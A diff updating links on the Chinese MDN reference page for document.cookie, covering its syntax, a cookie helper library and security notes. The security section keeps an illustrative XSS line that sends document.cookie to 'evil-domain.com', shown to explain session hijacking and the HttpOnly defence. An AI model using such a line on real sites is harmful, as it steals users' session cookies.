@@ -5,7 +5,7 @@ slug: Web/API/Document/cookie
 
 {{APIRef("DOM")}}
 
-获取并设置与当前文档相关联的 [cookie](/zh-CN/docs/Web/HTTP/Cookies)。可以把它当成一个 `getter and setter`。
+获取并设置与当前文档相关联的 [cookie](/zh-CN/docs/Web/HTTP/Guides/Cookies)。可以把它当成一个 `getter and setter`。
 
 ## 语法
 
@@ -26,17 +26,15 @@ document.cookie = newCookie;
 `newCookie` 是一个键值对形式的字符串。需要注意的是，用这个方法一次只能对一个 cookie 进行设置或更新。
 
 - 以下可选的 cookie 属性值可以跟在键值对后，用来具体化对 cookie 的设定/更新，使用分号以作分隔：
-
   - `;path=path` (例如 '/', '/mydir') 如果没有定义，默认为当前文档位置的路径。
   - `;domain=domain` (例如 'example.com'， 'subdomain.example.com') 如果没有定义，默认为当前文档位置的路径的域名部分。与早期规范相反的是，在域名前面加 . 符将会被忽视，因为浏览器也许会拒绝设置这样的 cookie。如果指定了一个域，那么子域也包含在内。
   - `;max-age=max-age-in-seconds` (例如一年为 60\*60\*24\*365)
   - `;expires=date-in-GMTString-format` 如果没有定义，cookie 会在对话结束时过期
-
-    - 这个值的格式参见[Date.toUTCString()](/zh-CN/docs/JavaScript/Reference/Global_Objects/Date/toUTCString)
+    - 这个值的格式参见[Date.toUTCString()](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Date/toUTCString)
 
   - `;secure` (cookie 只通过 https 协议传输)
 
-- cookie 的值字符串可以用[encodeURIComponent()](/zh-CN/docs/JavaScript/Reference/Global_Objects/encodeURIComponent)来保证它不包含任何逗号、分号或空格 (cookie 值中禁止使用这些值).
+- cookie 的值字符串可以用[encodeURIComponent()](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent)来保证它不包含任何逗号、分号或空格 (cookie 值中禁止使用这些值).
 
 > [!NOTE]
 > 在 Gecko 6.0 前，被引号括起的路径的引号会被当做路径的一部分，而不是被当做定界符。现在已被修复。
@@ -199,17 +197,17 @@ docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
 ##### 参数
 
 - `name` (必要)
-  - : 要创建或覆盖的 cookie 的名字 ([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String))。
+  - : 要创建或覆盖的 cookie 的名字 ([`string`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String))。
 - `value` (必要)
-  - : cookie 的值 ([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String))。
+  - : cookie 的值 ([`string`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String))。
 - `end` _(可选)_
-  - : [`最大年龄`](#new-cookie_max-age)的秒数 (一年为 31536e3，永不过期的 cookie 为[`Infinity`](/zh-CN/docs/JavaScript/Reference/Global_Objects/Infinity)) ，或者过期时间的 `GMTString` 格式或[`Date 对象`](/zh-CN/docs/JavaScript/Reference/Global_Objects/Date); 如果没有定义则会在会话结束时过期 ([`number`](/zh-CN/docs/JavaScript/Reference/Global_Objects/Number) – 有限的或 [`Infinity`](/zh-CN/docs/JavaScript/Reference/Global_Objects/Infinity) – [`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String), [`Date` object](/zh-CN/docs/JavaScript/Reference/Global_Objects/Date) or [`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。
+  - : [`最大年龄`](#new-cookie_max-age)的秒数 (一年为 31536e3，永不过期的 cookie 为[`Infinity`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Infinity)) ，或者过期时间的 `GMTString` 格式或[`Date 对象`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Date); 如果没有定义则会在会话结束时过期 ([`number`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Number) – 有限的或 [`Infinity`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Infinity) – [`string`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String), [`Date` object](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Date) or [`null`](/zh-CN/docs/Web/JavaScript/Reference/Operators/null))。
 - `path` _(可选)_
-  - : 例如 '/', '/mydir'。如果没有定义，默认为当前文档位置的路径。([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String) or [`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。路径必须为绝对路径（参见 [RFC 2965](http://www.ietf.org/rfc/rfc2965.txt)）。关于如何在这个参数使用相对路径的方法请参见[这段](#Using_relative_URLs_in_the_path_parameter)。
+  - : 例如 '/', '/mydir'。如果没有定义，默认为当前文档位置的路径。([`string`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String) or [`null`](/zh-CN/docs/Web/JavaScript/Reference/Operators/null))。路径必须为绝对路径（参见 [RFC 2965](https://www.ietf.org/rfc/rfc2965.txt)）。关于如何在这个参数使用相对路径的方法请参见[这段](#using_relative_urls_in_the_path_parameter)。
 - `domain` _(可选)_
-  - : 例如 'example.com'，'.example.com' (包括所有子域名), 'subdomain.example.com'。如果没有定义，默认为当前文档位置的路径的域名部分 (`string` 或 [`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。
+  - : 例如 'example.com'，'.example.com' (包括所有子域名), 'subdomain.example.com'。如果没有定义，默认为当前文档位置的路径的域名部分 (`string` 或 [`null`](/zh-CN/docs/Web/JavaScript/Reference/Operators/null))。
 - `secure` _(可选)_
-  - : cookie 只会被 https 传输 ([`boolean`](/zh-CN/docs/JavaScript/Reference/Global_Objects/Boolean)或[`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。
+  - : cookie 只会被 https 传输 ([`boolean`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Boolean)或[`null`](/zh-CN/docs/Web/JavaScript/Reference/Operators/null))。
 
 ### 得到 cookie
 
@@ -221,12 +219,12 @@ docCookies.getItem(name)
 
 ##### 描述
 
-读取一个 cookie。如果 cookie 不存在返回[`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null)。
+读取一个 cookie。如果 cookie 不存在返回[`null`](/zh-CN/docs/Web/JavaScript/Reference/Operators/null)。
 
 ##### 参数
 
 - `name`
-  - : 读取的 cookie 名 ([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String)).
+  - : 读取的 cookie 名 ([`string`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String)).
 
 ### 移除 cookie
 
@@ -243,11 +241,11 @@ docCookies.removeItem(name[, path],domain)
 ##### 参数
 
 - `name`
-  - : 要移除的 cookie 名 ([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String)).
+  - : 要移除的 cookie 名 ([`string`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String)).
 - `path` *(*可选*)*
-  - : 例如 '/', '/mydir'。如果没有定义，默认为当前文档位置的路径。([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String) or [`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。路径必须为绝对路径（参见 [RFC 2965](http://www.ietf.org/rfc/rfc2965.txt)）。关于如何在这个参数使用相对路径的方法请参见[这段](#Using_relative_URLs_in_the_path_parameter)。
+  - : 例如 '/', '/mydir'。如果没有定义，默认为当前文档位置的路径。([`string`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String) or [`null`](/zh-CN/docs/Web/JavaScript/Reference/Operators/null))。路径必须为绝对路径（参见 [RFC 2965](https://www.ietf.org/rfc/rfc2965.txt)）。关于如何在这个参数使用相对路径的方法请参见[这段](#using_relative_urls_in_the_path_parameter)。
 - `domain` (可选)
-  - : 例如 'example.com'， '.example.com' (包括所有子域名), 'subdomain.example.com'。如果没有定义，默认为当前文档位置的路径的域名部分 (`string` 或 [`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。
+  - : 例如 'example.com'， '.example.com' (包括所有子域名), 'subdomain.example.com'。如果没有定义，默认为当前文档位置的路径的域名部分 (`string` 或 [`null`](/zh-CN/docs/Web/JavaScript/Reference/Operators/null))。
 
 ### 检测 cookie
 
@@ -264,7 +262,7 @@ docCookies.hasItem(name)
 ##### 参数
 
 - `name`
-  - : 要检查的 cookie 名 ([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String)).
+  - : 要检查的 cookie 名 ([`string`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String)).
 
 ### 得到所有 cookie 的列表
 
@@ -316,7 +314,7 @@ alert(docCookies.getItem("test1;="));
 
 ## 安全
 
-路径限制并**不能**阻止从其他路径访问 cookie. 使用简单的 DOM 即可轻易地绕过限制 (比如创建一个指向限制路径的，隐藏的[iframe](/zh-CN/docs/Web/HTML/Element/iframe), 然后访问其 `contentDocument.cookie` 属性). 保护 cookie 不被非法访问的唯一方法是将它放在另一个域名/子域名之下，利用[同源策略](/zh-CN/docs/Web/Security/Same-origin_policy)保护其不被读取。
+路径限制并**不能**阻止从其他路径访问 cookie. 使用简单的 DOM 即可轻易地绕过限制 (比如创建一个指向限制路径的，隐藏的[iframe](/zh-CN/docs/Web/HTML/Reference/Elements/iframe), 然后访问其 `contentDocument.cookie` 属性). 保护 cookie 不被非法访问的唯一方法是将它放在另一个域名/子域名之下，利用[同源策略](/zh-CN/docs/Web/Security/Same-origin_policy)保护其不被读取。
 
 Web 应用程序通常使用 cookies 来标识用户身份及他们的登录会话。因此通过窃听这些 cookie，就可以劫持已登录用户的会话。窃听的 cookie 的常见方法包括社会工程和 XSS 攻击 -
 
@@ -325,19 +323,19 @@ new Image().src =
   "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
-`HttpOnly` 属性可以阻止通过 javascript 访问 cookie，从而一定程度上遏制这类攻击。参见 [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/).
+`HttpOnly` 属性可以阻止通过 javascript 访问 cookie，从而一定程度上遏制这类攻击。参见 [Cookies and Security](https://www.nczonline.net/blog/2009/05/12/cookies-and-security/).
 
 ## 备注
 
-- 从 Firefox 2 起，有更好的客户端存储机制用以替代 cookie - [WHATWG DOM Storage](/zh-CN/docs/DOM/Storage).
+- 从 Firefox 2 起，有更好的客户端存储机制用以替代 cookie - [WHATWG DOM Storage](/zh-CN/docs/Web/API/Web_Storage_API).
 - 你可以通过更新一个 cookie 的过期时间为 0 来删除一个 cookie。
-- 请注意，更多/更大的 cookies 意味着每个请求都要包含更繁重的数据传输。如果你只是需要存储些 "client-only" 的数据，那么郑重建议你使用 [WHATWG DOM Storage](/zh-CN/docs/DOM/Storage).
+- 请注意，更多/更大的 cookies 意味着每个请求都要包含更繁重的数据传输。如果你只是需要存储些 "client-only" 的数据，那么郑重建议你使用 [WHATWG DOM Storage](/zh-CN/docs/Web/API/Web_Storage_API).
 
 ## 规范
 
-[DOM Level 2: HTMLDocument.cookie](http://www.w3.org/TR/DOM-Level-2-HTML/html.html#ID-8747038)
+[DOM Level 2: HTMLDocument.cookie](https://www.w3.org/TR/DOM-Level-2-HTML/html.html#ID-8747038)
 
 ## 参见
 
-- [HTTP cookies](/zh-CN/docs/Web_Development/HTTP_cookies)
+- [HTTP cookies](/zh-CN/docs/Web/HTTP/Guides/Cookies)
 - [Cookies](/zh-CN/docs/Code_snippets/Cookies) (Code snippets)
